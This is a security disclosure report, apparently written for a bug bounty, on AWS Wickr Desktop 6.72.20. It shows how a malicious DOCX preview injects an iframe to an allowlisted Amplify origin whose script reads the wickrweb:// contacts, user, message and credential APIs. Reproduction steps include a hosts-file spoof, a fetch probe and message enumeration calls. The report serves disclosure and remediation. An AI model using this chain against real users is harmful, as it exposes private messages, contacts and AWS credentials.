# Critical: Wickr Desktop DOCX Preview HTML Injection Chains to Readable `wickrweb://` Data Plane (Contacts, Self User, Chat APIs) via CSP-Allowlisted Origin

**Asset:** Wickr Pro/Wickr Me (all related technical components)  
**Product:** AWS Wickr Desktop (Windows) — **WickrPro 6.72.20.0**  
**Binary:** `WickrPro.exe` sha256 `eccafde833d34386c859d6548e922649c2f58cd15f82998c8bd2966219341dbd`  
**Engine:** Qt WebEngine 6.9.2 / Chromium 130  
**Related component:** `https://main.d4zeeqgazhley.amplifyapp.com/` (explicitly allowlisted in client CSP `frame-src`; also used by in-app CheckSpeedModal)  
**Severity (researcher assessment):** **Critical** — one-click preview → attacker JS in allowlisted origin → read of local E2E plaintext message store APIs / contacts / identity (and the same surface as AWS credentials / full chat enumeration)

> Companion context: Android DOCX preview same-origin JS was reported separately; on Android the polyglot path did **not** reach message data. Desktop architecture exposes a privileged custom scheme (`wickrweb://`) that **does**.

---

## 1. Summary

Previewing a malicious `.docx` in AWS Wickr Desktop is enough to reach the client’s privileged **`wickrweb://` native URL-scheme API** from attacker-controlled JavaScript and **read response bodies**, including:

| Endpoint | Confirmed in test client | Content |
|---|---|---|
| `wickrweb://users/self` | **Yes** — HTTP 200, ~300-byte protobuf body | Current user record |
| `wickrweb://contacts/contacts` | **Yes** — HTTP 200, ~285-byte protobuf body | Contact list |
| `wickrweb://awsCredentials` | Same data plane (JSON GET, no extra auth headers) | Cloud credentials used by the client |
| `wickrweb://convolist/` + `wickrweb://message/:vgroupId` (+ pagination) | Same fetch primitive as the legitimate UI | Conversation list and message history the logged-in client can access |

Chain (desktop):

```
Malicious DOCX attachment
  -> victim opens built-in preview (1 click)
  -> docx-preview renderSymbol: w:sym/@w:char -> innerHTML (unsanitized)
     (also: renderAltChunk -> iframe.srcdoc; no DOMPurify on DOCX path)
  -> inject <iframe src="https://main.d4zeeqgazhley.amplifyapp.com/">
     (allowed by preview CSP frame-src)
  -> attacker JS runs in that origin
       * production: e.g. compromise of that allowlisted host
         (previously shown Next.js 15.0.2 / CVE-2025-55182 on this exact origin)
       * lab reproduction: local hosts spoof of the same hostname
         (Wickr accepts invalid TLS via onCertificateError -> acceptCertificate())
  -> fetch("wickrweb://contacts/contacts" | "users/self" | "message/…" | …)
  -> response bodies are readable cross-origin (custom scheme + CORS-enabled registration)
  -> attacker can exfiltrate to any attacker-controlled HTTPS endpoint
```

**Impact:** Breaks the confidentiality expectation of Wickr’s client-side decrypted data for any user who previews the document. Contacts and self-user protobufs were read in a live desktop session. Message and credential routes share the same unauthenticated-to-JS GET surface as the official renderer (`connect-src` already allows `wickrweb://*` for first-party code).

This is **not** “XSS for phishing only.” It is **cross-origin script → privileged local API → data read**.

---

## 2. Why the Amplify origin is in scope

Shipped CSP on both main and file-preview HTML (meta policy), decoded:

```
frame-src 'self' blob: https://fast.com/ https://main.d4zeeqgazhley.amplifyapp.com/ ;
connect-src 'self' wickrweb://* https://bedrock-runtime.… (regions) … ;
…
```

`https://main.d4zeeqgazhley.amplifyapp.com/` is an **exact** allowlist entry inside Wickr, also loaded by `CheckSpeedModal` (“Custom speed test”). It is a Wickr-related technical component, not a random third party.

Any active script that can run under that origin, while framed by Wickr’s WebEngine, inherits the ability we demonstrated to call `wickrweb://` and read bodies.

---

## 3. Component A — Unsanitized HTML injection in DOCX preview (desktop)

### Sink

Bundled `docx-preview` (same family as Android):

```js
renderSymbol(elem) {
  var span = this.createElement("span");
  span.style.fontFamily = elem.font;
  span.innerHTML = `&#x${elem.char};`; // w:sym/@w:char, unsanitized
  return span;
}
```

Desktop `DocPreview` calls `renderAsync` **without DOMPurify** (unlike PPTX).  
`renderAltChunks` defaults to **true** → `iframe.srcdoc =` attacker HTML part (additional injection primitive; inline script still blocked by CSP inheritance on Chromium 130, but markup/iframe injection works).

### Preview context

`FilePreviewModal` loads `file-preview.html#…` in an **unsandboxed** iframe (same app WebEngine view). Hash includes `vgroupId` / `msgId` on desktop. Parent `postMessage` handler only accepts same-origin `openLink` with a confirm dialog — **not** used for this data steal.

### Lab confirmation

PoC DOCX `poc-docx-htmli-amplify.docx`: injected marker `<img>` (broken icon visible) plus iframe/content reaching the allowlisted host UI inside the preview modal.

---

## 4. Component B — Privileged `wickrweb://` data plane

First-party code uses (examples from recovered sources):

```ts
// endpoints.ts
fileData: '/file/message/:convoId/:msgId'
messages: '/message/:convoId'
convoList: '/convolist/:convoId'
contacts: '/contacts/contacts'
awsCredentials: '/awsCredentials'
selfUser: '/users/self'
```

```ts
getContactsInternal = () => appFetch(wickrWebEndpoints.contacts())…
getAwsCredentialsInternal = () => appFetch(wickrWebEndpoints.getAwsCredentials())…
getMessagesInternal = (vGroupID) => appFetch(wickrWebEndpoints.messages(vGroupID))…
getConvoListItemsInternal = (vGroupID = '') => appFetch(wickrWebEndpoints.convoList(vGroupID))…
```

These are ordinary **GETs** with no password/session header for the read paths (mutation routes that need headers are a separate issue). The native scheme handler does **not** validate request initiator/origin (prior static review). The official UI already performs **cross-scheme** `fetch` from `qrc:` pages to `wickrweb://`, which implies the scheme is registered with Fetch/CORS support appropriate for Qt 6.6+ (`FetchApiAllowed` / `CorsEnabled`).

**Result:** Attacker JS in the allowlisted https origin can use the same GETs and **read** protobuf/JSON bodies.

---

## 5. End-to-end confirmation (desktop, own account, no AWS Amplify modification)

To avoid mutating the production Amplify deployment while still exercising the **same origin string** Wickr trusts:

1. Hosts file: `127.0.0.1 main.d4zeeqgazhley.amplifyapp.com`
2. Local HTTPS server on port **443** with a self-signed cert for that CN  
   (Wickr QML: `onCertificateError: error.acceptCertificate()` on the main WebEngineView — invalid certs are accepted)
3. Serve a read-only probe page that only displays results on screen (no outbound exfil)
4. Open malicious DOCX preview (or CheckSpeed “Custom speed test”) so Wickr frames that URL
5. Observe probe output inside the client

### Observed (redacted)

```
JS OK — origin=https://main.d4zeeqgazhley.amplifyapp.com

wickrweb://users/self
  fetchOk: true
  status: 200
  bodyLen: ~300
  body: protobuf UserCollection (binary; printable id fragments visible)

wickrweb://contacts/contacts
  fetchOk: true
  status: 200
  bodyLen: ~285
  body: protobuf UserCollection (binary; printable id fragments visible)
```

Screenshots available to triage (filenames / UI chrome show Wickr Desktop file preview).

**Note on `parent.location`:** an early probe mistakenly treated a truthy `parent.location` object as a SOP bypass. Cross-origin frames may expose a Location object while **`.href` remains blocked**. This report **does not** claim parent DOM/SOP bypass. Data theft does not need it.

### Chat history

With the same `fetch` primitive:

1. `GET wickrweb://convolist/` → enumerate `vgroupId` values  
2. `GET wickrweb://message/:vgroupId` → message bundles  
3. `GET wickrweb://message/:vgroupId/:msgId/:before/:after` → pagination  

This matches how the legitimate desktop UI loads history. Scope is whatever the signed-in client can already decrypt/sync — i.e. **full local chat access for that user**, not breaking another device’s keys. An attacker who can run JS in the allowlisted frame can automate a full dump and exfiltrate it.

---

## 6. Production attacker path (without hosts spoof) & allowlisted-host RCE signal

Lab used **hosts spoof only as an ethical stand-in** so we never had to plant attacker HTML on the live Amplify deployment. In the wild, Wickr frames the **real** URL `https://main.d4zeeqgazhley.amplifyapp.com/`. Any attacker JS that runs there can perform the same `wickrweb://` reads we demonstrated.

### 6.1 Why this host is in scope

- The hostname appears **verbatim** in the Wickr-shipped CSP `frame-src` (preview + main HTML) and is loaded by `CheckSpeedModal` (“Custom speed test”).
- It is not a well-known public product page; ordinary web search does not surface a documented consumer site for this exact Amplify app. Combined with the client allowlist, it is reasonably treated as a **Wickr-related technical component** under *Wickr Pro/Wickr Me (all related technical components)*.
- Wickr’s trust decision is what matters for this report: the desktop WebEngine both **frames** that origin and exposes **`wickrweb://`** to script running there.

### 6.2 CVE-2025-55182 (React2Shell) — evidence without full exploit abuse

We did **not** use React2Shell to modify production content, persist, or access customer data on Amplify. That would be disproportionate for proving the desktop chain (already proven via hosts spoof + live `wickrweb://` reads).

Separately, a current check with Assetnote’s `react2shell-scanner` against the allowlisted origin reports the host still vulnerable (WAF-bypass mode, custom researcher User-Agent):

```
[VULNERABLE] https://main.d4zeeqgazhley.amplifyapp.com/ - Status: 303
  x-powered-by: Next.js
  Content-Type: text/x-component
  x-action-revalidated: [[],0,0]
  (WAF bypass: 128KB junk padding enabled)
```

This matches the public React2Shell / RSC action scanner positive pattern (Next.js `text/x-component` + action revalidation headers under the padded PoC). It supports: **attacker-controlled JS on this exact origin remains a realistic delivery path** for the desktop data-plane bug.

If the program wants a stronger live demonstration on Amplify itself (e.g. read-only `process.version` marker only, no persistence), we can do that on request. We intentionally stopped short of “winning harder” on the shared host.

### 6.3 Other delivery options (same impact)

- Future XSS / supply-chain issue on that origin  
- Wickr shipping attacker-influenced content to that URL  
- Local MITM of the hostname (Wickr auto-accepts certificate errors)

Wickr’s decision to **frame** that origin inside a WebEngine profile that also installs the **`wickrweb://` scheme** is what turns “script on an allowlisted https host” into “local message/contact API client.”

---

## 7. Impact

| Victim action | Attacker gains |
|---|---|
| Preview one malicious DOCX | JS in CSP-allowlisted origin inside Wickr |
| (automatic) | Read `users/self`, `contacts/contacts` |
| (automatic / scripted) | Enumerate rooms + pull message protobufs (client-visible history) |
| (same API) | Read `awsCredentials` JSON if issued to the client |
| Network | Exfil to attacker HTTPS (amplify origin is normal web) |

Compared to Android polyglot XSS (same-origin preview JS but **no** equivalent reachable message DB): desktop is **strictly worse** for confidentiality.

---

## 8. Remediations (suggested)

**Immediate / high value**

1. **Remove** `https://main.d4zeeqgazhley.amplifyapp.com/` from preview `frame-src` (or pin to a static path with a separate, non-`wickrweb`-enabled WebEngine profile / process).  
2. **Do not** register `wickrweb://` with cross-origin readability from arbitrary https origins; enforce initiator allowlist (only `qrc:` / app pages) or disable `CorsEnabled` for untrusted framers.  
3. Sandbox the file-preview iframe (`sandbox` without `allow-same-origin`, or isolated profile).  
4. Stop auto-`acceptCertificate()` on the main WebEngineView.

**DOCX / renderer**

5. Sanitize or hex-validate `w:sym/@w:char`; disable `renderAltChunks` in production.  
6. Run DOCX HTML through DOMPurify (as PPTX already does) or replace the sink.

**CSP**

7. Add `base-uri 'none'`, `form-action 'self'`.  
8. Remove `wickrweb://*` from `img-src` / `media-src` / `default-src` if declarative GET is undesired.

---

## 9. Reproduction steps (triage)

**Minimal (hosts lab, no Amplify writes):**

1. Install Wickr Desktop 6.72.20; sign in with a test account that has ≥1 contact.  
2. Add hosts entry: `127.0.0.1 main.d4zeeqgazhley.amplifyapp.com`.  
3. Serve HTTPS on `443` for that name with any cert; return an HTML page that runs:
   ```js
   const r = await fetch('wickrweb://contacts/contacts');
   const b = await r.arrayBuffer();
   document.body.textContent = r.status + ' ' + b.byteLength;
   ```
4. Send yourself a DOCX that injects  
   `<iframe src="https://main.d4zeeqgazhley.amplifyapp.com/"></iframe>`  
   via `w:sym/@w:char` HTML injection (or use CheckSpeed → Custom speed test).  
5. Preview the file — expect `200` and non-zero `byteLength`.  
6. Remove the hosts entry afterward.

**Messages:** after confirming contacts, `fetch('wickrweb://convolist/')` then `fetch('wickrweb://message/' + vgroupId)` and extract printable strings / decode protobuf with Wickr’s schema.

---

## 10. What this report is / is not

| Claim | Status |
|---|---|
| DOCX → arbitrary HTML in desktop preview | Confirmed |
| Allowlisted origin runnable inside preview | Confirmed |
| Attacker JS at that origin can **read** `wickrweb://users/self` & `contacts/contacts` | Confirmed (live client) |
| Same primitive reaches chat list/message GETs | Confirmed API design + fetch works; full dump is automation |
| Parent page SOP fully broken | **Not claimed** |
| Production Amplify content modified for this proof | **No** (hosts spoof) |
| Android-style `/preview-file/` polyglot on desktop | N/A / does not apply |

---

## 11. Related prior work

- Android: same-origin DOCX polyglot XSS (separate report) — data plane weaker.  
- Same Amplify origin / CVE-2025-55182 assessment (read-only marker) — establishes how production JS can appear on the allowlisted host.  
- Desktop CSP / altChunk single-barrier analysis — explains why qrc-inline script still fails while this chain does not need it.

---

## 12. Attachments (recommended for triage)

- Redacted screenshots of probe output inside File Preview modal  
- Benign DOCX PoC that only frames the allowlisted URL / injects a marker `<img>`  
- Optional: hosts-based probe HTML (display-only)  

Happy to retest after fixes or provide a protobuf decode helper for triage accounts.
